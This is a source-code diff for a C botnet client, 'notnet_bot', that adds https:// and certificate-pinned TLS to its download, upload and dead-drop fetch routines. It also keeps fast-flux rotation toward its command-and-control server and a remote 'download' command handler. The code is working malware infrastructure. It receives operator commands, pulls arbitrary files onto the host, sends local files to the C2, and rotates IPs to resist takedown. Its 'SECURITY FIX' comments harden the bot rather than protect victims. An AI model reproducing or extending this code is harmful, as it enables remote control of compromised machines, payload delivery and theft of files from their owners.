@@ -866,6 +866,11 @@ int http_post(notnet_bot_t *bot, const char *data, int len) {
 }
 /* Forward declaration: tcp_connect_sock defined below (used by http_get_url). */
 static int tcp_connect_sock(notnet_bot_t *bot, const char *host, uint16_t port);
+/* Forward declaration: http_connect_url (http/https connect+TLS helper, #135). */
+static int http_connect_url(notnet_bot_t *bot, const char *url,
+                             char *host, size_t host_sz,
+                             uint16_t *port, char *path, size_t path_sz,
+                             notnet_tls_t *tls_out);
 
 /* Dead-drop / arbitrary-URL fetch (#86). GET a plaintext http:// URL into
  * buf (bounded to len bytes total incl. headers) with a 10s timeout, and
@@ -876,34 +881,20 @@ static int tcp_connect_sock(notnet_bot_t *bot, const char *host, uint16_t port);
  * the default build has no TLS — so callers must NOT treat the transport as a
  * trust boundary; verification must happen on the payload (see deaddrop.c). */
 int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len) {
-    if (!url || url[0] == '\0' || strncmp(url, "http://", 7) != 0) {
-        log_warn("HTTP: http_get_url requires an http:// URL");
+    if (!url || url[0] == '\0' ||
+        (strncmp(url, "http://", 7) != 0 && strncmp(url, "https://", 8) != 0)) {
+        log_warn("HTTP: http_get_url requires an http:// or https:// URL");
         return -1;
     }
     char host[256];
-    uint16_t port = 80;
+    uint16_t port = 0;
     char path[512];
-    const char *p = url + 7;
-    const char *slash = strchr(p, '/');
-    size_t alen = slash ? (size_t)(slash - p) : strlen(p);
-    if (alen == 0 || alen >= sizeof(host)) {
-        log_warn("HTTP: http_get_url malformed URL: %s", url);
-        return -1;
-    }
-    memcpy(host, p, alen);
-    host[alen] = '\0';
-    char *colon = strrchr(host, ':');
-    if (colon) {
-        *colon = '\0';
-        int pv = atoi(colon + 1);
-        if (pv >= 1 && pv <= 65535) port = (uint16_t)pv;
-    }
-    if (slash) snprintf(path, sizeof(path), "%s", slash);
-    else snprintf(path, sizeof(path), "/");
-
-    int sock = tcp_connect_sock(bot, host, port);
+    notnet_tls_t tls;
+    tls.enabled = 0; tls.ssl = NULL; tls.sock = -1;
+    int sock = http_connect_url(bot, url, host, sizeof(host), &port,
+                                path, sizeof(path), &tls);
     if (sock < 0) {
-        log_warn("HTTP: http_get_url connect to %s:%u failed: %s", host, port, strerror(errno));
+        log_warn("HTTP: http_get_url connect to %s failed: %s", url, strerror(errno));
         return -1;
     }
 
@@ -915,7 +906,7 @@ int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len) {
         "Connection: close\r\n"
         "\r\n",
         path, host, bot->c2_http.user_agent);
-    int sent = send(sock, req, reqlen, 0);
+    int sent = chan_send(&tls, sock, req, reqlen);
     if (sent < 0 || sent != reqlen) {
         log_warn("HTTP: http_get_url send failed: %s", strerror(errno));
         close(sock);
@@ -934,7 +925,7 @@ int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len) {
         int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
         if (sel <= 0) break;  /* timeout, EOF, or error */
 
-        int received = recv(sock, buf + total, len - total - 1, 0);
+        int received = chan_recv(&tls, sock, buf + total, len - total - 1);
         if (received <= 0) break;
         total += received;
     }
@@ -1078,54 +1069,113 @@ static int tcp_connect_sock(notnet_bot_t *bot, const char *host, uint16_t port) 
     return sock;
 }
 
+/* Shared URL parser + connect for one-shot fetches (http_download,
+ * http_get_url, http_upload). Supports http:// and https://. For https://
+ * the socket is upgraded to TLS and the peer cert is verified against the
+ * bot's configured pin (tls_cert_pin_sha256) — but ONLY when TLS is
+ * compiled in (make TLS=1). A plaintext http:// URL never upgrades.
+ *
+ * On success returns the connected socket (>=0) and fills host/port/path
+ * (path includes the leading '/'). The caller must chan_send/chan_recv
+ * (not raw send/recv) when *tls_out.enabled is set, and close the socket.
+ * Returns -1 on parse/connect/TLS failure.
+ *
+ * #135: previously https:// was rejected everywhere; now TLS builds can
+ * fetch over https. */
+static int http_connect_url(notnet_bot_t *bot, const char *url,
+                             char *host, size_t host_sz,
+                             uint16_t *port, char *path, size_t path_sz,
+                             notnet_tls_t *tls_out) {
+    if (!url || url[0] == '\0') return -1;
+    int https = 0;
+    const char *scheme = NULL;
+    if (strncmp(url, "https://", 8) == 0) { https = 1; scheme = url + 8; }
+    else if (strncmp(url, "http://", 7) == 0) { scheme = url + 7; }
+    else return -1;
+
+    if (tls_out) { tls_out->enabled = 0; tls_out->ssl = NULL; tls_out->sock = -1; }
+
+    const char *slash = strchr(scheme, '/');
+    size_t alen = slash ? (size_t)(slash - scheme) : strlen(scheme);
+    if (alen == 0 || alen >= host_sz) return -1;
+    memcpy(host, scheme, alen);
+    host[alen] = '\0';
+    *port = https ? 443 : 80;
+    char *colon = strrchr(host, ':');
+    if (colon) {
+        *colon = '\0';
+        int pv = atoi(colon + 1);
+        if (pv >= 1 && pv <= 65535) *port = (uint16_t)pv;
+    }
+    if (slash) snprintf(path, path_sz, "%s", slash);
+    else snprintf(path, path_sz, "/");
+
+    int sock = tcp_connect_sock(bot, host, *port);
+    if (sock < 0) return -1;
+
+#ifdef TLS_ENABLED
+    if (https) {
+        /* #135: upgrade to TLS and verify the cert pin. No pin configured
+         * means the channel stays plaintext per tls_setup()'s contract, but
+         * for an explicit https:// URL we require a pin to avoid shipping an
+         * unauthenticated (MITM-able) TLS session. */
+        if (tls_setup(tls_out, sock, host, bot->tls_cert_pin_sha256) != 0) {
+            close(sock);
+            return -1;
+        }
+        if (!tls_out->enabled) {
+            log_error("HTTP: https:// requested but TLS not pinned — refusing");
+            close(sock);
+            return -1;
+        }
+    }
+#else
+    if (https) {
+        log_error("HTTP: https:// URL but TLS not compiled in (make TLS=1)");
+        close(sock);
+        return -1;
+    }
+#endif
+    return sock;
+}
+
 int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
     /* Parse the target URL. Fall back to the configured C2 endpoint
      * when url is NULL/empty so the old callers keep working. */
     char host[256];
-    uint16_t port;
+    uint16_t port = 0;
     char path[512];
-    int is_c2_fallback = 0;   /* SECURITY FIX (#85): flux only applies to the C2 endpoint */
+    notnet_tls_t tls;
+    tls.enabled = 0; tls.ssl = NULL; tls.sock = -1;
 
-    if (url && strncmp(url, "http://", 7) == 0) {
-        char authority[256];
-        const char *p = url + 7;
-        const char *slash = strchr(p, '/');
-        size_t alen = slash ? (size_t)(slash - p) : strlen(p);
-        if (alen == 0 || alen >= sizeof(authority)) {
-            log_error("HTTP download: malformed URL %s", url);
+    int sock = -1;
+    if (url && (strncmp(url, "http://", 7) == 0 || strncmp(url, "https://", 8) == 0)) {
+        /* #135: http_connect_url parses http:// AND https://, upgrading to
+         * TLS (with cert-pin verification) for https:// when compiled in. */
+        sock = http_connect_url(bot, url, host, sizeof(host), &port,
+                                 path, sizeof(path), &tls);
+        if (sock < 0) {
+            log_error("HTTP download: connect to %s failed", url);
             return -1;
         }
-        memcpy(authority, p, alen);
-        authority[alen] = '\0';
-
-        snprintf(host, sizeof(host), "%s", authority);
-        port = 80;
-        char *colon = strrchr(host, ':');
-        if (colon) {
-            *colon = '\0';
-            port = (uint16_t)atoi(colon + 1);
-            if (port == 0) port = 80;
-        }
-        if (slash) snprintf(path, sizeof(path), "%s", slash);
-        else snprintf(path, sizeof(path), "/");
     } else {
-        is_c2_fallback = 1;
         snprintf(host, sizeof(host), "%s", bot->c2_http.server);
         port = bot->c2_http.port;
         snprintf(path, sizeof(path), "%s", bot->c2_http.path);
-    }
-
-    /* SECURITY FIX (#85): For the C2 endpoint in flux mode, connect via
-     * the current rotating IP but keep the hostname in the Host header
-     * (virtual-host routing on the C2 side still works). Explicit URLs
-     * are always fetched directly. */
-    const char *connect_host = host;
-    char flux_ip[INET_ADDRSTRLEN];
-    if (bot->flux_enabled && is_c2_fallback) {
-        struct in_addr fa;
-        if (flux_pick_ip(bot, host, &fa) == 0 &&
-            inet_ntop(AF_INET, &fa, flux_ip, sizeof(flux_ip))) {
-            connect_host = flux_ip;
+        const char *connect_host = host;
+        char flux_ip[INET_ADDRSTRLEN];
+        if (bot->flux_enabled) {
+            struct in_addr fa;
+            if (flux_pick_ip(bot, host, &fa) == 0 &&
+                inet_ntop(AF_INET, &fa, flux_ip, sizeof(flux_ip))) {
+                connect_host = flux_ip;
+            }
+        }
+        sock = tcp_connect_sock(bot, connect_host, port);
+        if (sock < 0) {
+            log_error("http_download: connect to %s:%u failed", host, port);
+            if (bot->flux_enabled) flux_mark_failed(bot, host);
+            return -1;
         }
     }
 
@@ -1140,13 +1190,6 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
     int hdr_len = 0;
     int body_start = -1;   /* offset in hdr_buf where body begins, -1 until found */
 
-    int sock = tcp_connect_sock(bot, connect_host, port);
-    if (sock < 0) {
-        log_error("http_download: connect to %s:%u failed", host, port);
-        if (bot->flux_enabled && is_c2_fallback) flux_mark_failed(bot, host);
-        return -1;
-    }
-
     char req[1024];
     int reqlen = snprintf(req, sizeof(req),
         "GET %s HTTP/1.1\r\n"
@@ -1156,7 +1199,7 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
         "\r\n",
         path, host, bot->c2_http.user_agent);
 
-    if (send(sock, req, reqlen, 0) != reqlen) {
+    if (chan_send(&tls, sock, req, reqlen) != reqlen) {
         log_warn("http_download: GET send failed: %s", strerror(errno));
         close(sock);
         return -1;
@@ -1175,7 +1218,7 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
         int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
         if (sel <= 0) break;  /* timeout or error */
 
-        int received = recv(sock, hdr_buf + hdr_len, HDR_BUF_SIZE - hdr_len - 1, 0);
+        int received = chan_recv(&tls, sock, hdr_buf + hdr_len, HDR_BUF_SIZE - hdr_len - 1);
         if (received <= 0) break;
         hdr_len += received;
         hdr_buf[hdr_len] = '\0';
@@ -1244,9 +1287,9 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
         int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
         if (sel <= 0) break;  /* timeout, EOF, or error */
 
-        int received = recv(sock, stream_buf, sizeof(stream_buf), 0);
+        int received = chan_recv(&tls, sock, stream_buf, sizeof(stream_buf));
         if (received <= 0) break;
-        fwrite(stream_buf, 1, received, f);
+        fwrite(stream_buf, 1, (size_t)received, f);
         body_len += received;
     }
     fclose(f);
@@ -1305,33 +1348,21 @@ int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_pat
     char host[256];
     uint16_t port;
     char path[512];
-    int is_c2_fallback = 0;   /* SECURITY FIX (#85): flux only applies to the C2 endpoint */
+    notnet_tls_t tls;
+    tls.enabled = 0; tls.ssl = NULL; tls.sock = -1;
+    int sock = -1;
 
-    if (upload_path && strncmp(upload_path, "http://", 7) == 0) {
-        char authority[256];
-        const char *p = upload_path + 7;
-        const char *slash = strchr(p, '/');
-        size_t alen = slash ? (size_t)(slash - p) : strlen(p);
-        if (alen == 0 || alen >= sizeof(authority)) {
-            log_error("http_upload: malformed URL %s", upload_path);
+    if (upload_path && (strncmp(upload_path, "http://", 7) == 0 ||
+                         strncmp(upload_path, "https://", 8) == 0)) {
+        /* #135: http_connect_url also parses https:// and upgrades to TLS. */
+        sock = http_connect_url(bot, upload_path, host, sizeof(host),
+                                      &port, path, sizeof(path), &tls);
+        if (sock < 0) {
+            log_error("http_upload: connect to %s failed", upload_path);
             free(file_data);
             return -1;
         }
-        memcpy(authority, p, alen);
-        authority[alen] = '\0';
-
-        snprintf(host, sizeof(host), "%s", authority);
-        port = 80;
-        char *colon = strrchr(host, ':');
-        if (colon) {
-            *colon = '\0';
-            port = (uint16_t)atoi(colon + 1);
-            if (port == 0) port = 80;
-        }
-        if (slash) snprintf(path, sizeof(path), "%s", slash);
-        else snprintf(path, sizeof(path), "/");
     } else {
-        is_c2_fallback = 1;
         /* SECURITY FIX (#110): on a rotated backup the upload must dial
          * AND name the effective endpoint, not the primary's host/port. */
         snprintf(host, sizeof(host), "%s",
@@ -1340,28 +1371,22 @@ int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_pat
         port = bot->c2_http.effective_port ? bot->c2_http.effective_port
                                            : bot->c2_http.port;
         snprintf(path, sizeof(path), "%s", upload_path ? upload_path : bot->c2_http.path);
-    }
-
-    /* SECURITY FIX (#85): For the C2 endpoint in flux mode, connect via
-     * the current rotating IP but keep the hostname in the Host header.
-     * Explicit URLs are always uploaded directly. */
-    const char *connect_host = host;
-    char flux_ip[INET_ADDRSTRLEN];
-    if (bot->flux_enabled && is_c2_fallback) {
-        struct in_addr fa;
-        if (flux_pick_ip(bot, host, &fa) == 0 &&
-            inet_ntop(AF_INET, &fa, flux_ip, sizeof(flux_ip))) {
-            connect_host = flux_ip;
+        const char *connect_host = host;
+        char flux_ip[INET_ADDRSTRLEN];
+        if (bot->flux_enabled) {
+            struct in_addr fa;
+            if (flux_pick_ip(bot, host, &fa) == 0 &&
+                inet_ntop(AF_INET, &fa, flux_ip, sizeof(flux_ip))) {
+                connect_host = flux_ip;
+            }
         }
-    }
-
-    /* Connect to server */
-    int sock = tcp_connect_sock(bot, connect_host, port);
-    if (sock < 0) {
-        log_error("http_upload: connect to %s:%u failed", host, port);
-        if (bot->flux_enabled && is_c2_fallback) flux_mark_failed(bot, host);
-        free(file_data);
-        return -1;
+        sock = tcp_connect_sock(bot, connect_host, port);
+        if (sock < 0) {
+            log_error("http_upload: connect to %s:%u failed", host, port);
+            if (bot->flux_enabled) flux_mark_failed(bot, host);
+            free(file_data);
+            return -1;
+        }
     }
 
     /* Build POST request with Content-Length */
@@ -1376,7 +1401,7 @@ int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_pat
         "\r\n",
         path, host, file_size, bot->c2_http.user_agent);
 
-    if (send(sock, headers, hdr_len, 0) != hdr_len) {
+    if (chan_send(&tls, sock, headers, hdr_len) != hdr_len) {
         log_warn("http_upload: headers send failed: %s", strerror(errno));
         close(sock);
         free(file_data);
@@ -1384,7 +1409,7 @@ int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_pat
     }
 
     /* Send file body */
-    int sent = send(sock, file_data, file_size, 0);
+    int sent = chan_send(&tls, sock, file_data, file_size);
     free(file_data);
 
     if (sent < 0 || sent < file_size) {
@@ -1407,7 +1432,7 @@ int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_pat
         int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
         if (sel <= 0) break;
 
-        int received = recv(sock, buf + total, (int)sizeof(buf) - total - 1, 0);
+        int received = chan_recv(&tls, sock, buf + total, (int)sizeof(buf) - total - 1);
         if (received <= 0) break;
         total += received;
     }
@@ -2393,16 +2418,14 @@ int protocol_process_commands(notnet_bot_t *bot) {
             if (url[0] == '\0') {
                 protocol_send_response(bot, CMD_DOWNLOAD,
                     "download: usage 'download <url> [path]'");
-            } else if (strncmp(url, "http://", 7) != 0) {
-                /* SECURITY FIX (#111): only http:// is implemented.
-                 * http_download() parses http:// URLs; an https:// URL was
-                 * previously ACCEPTED by this gate, then silently fell into
-                 * the C2-fallback branch and downloaded the heartbeat path
-                 * with a 'download ok' response. The default build has no
-                 * TLS, so https is rejected explicitly — no silent
-                 * substitution of the wrong resource. */
+            } else if (strncmp(url, "http://", 7) != 0 && strncmp(url, "https://", 8) != 0) {
+                /* SECURITY FIX (#111): only http(s):// is implemented.
+                 * http_download() parses both; https:// upgrades to TLS when
+                 * the build has TLS_ENABLED and a cert pin is configured
+                 * (#135). An unrecognized scheme is rejected explicitly — no
+                 * silent substitution of the wrong resource. */
                 protocol_send_response(bot, CMD_DOWNLOAD,
-                    "download: url must start with http:// (no TLS in this build)");
+                    "download: url must start with http:// or https://");
             } else if (strpbrk(dest, ";|&`$(){}[]<>!\n\r")) {
                 protocol_send_response(bot, CMD_DOWNLOAD,
                     "download: path rejected (dangerous character)");
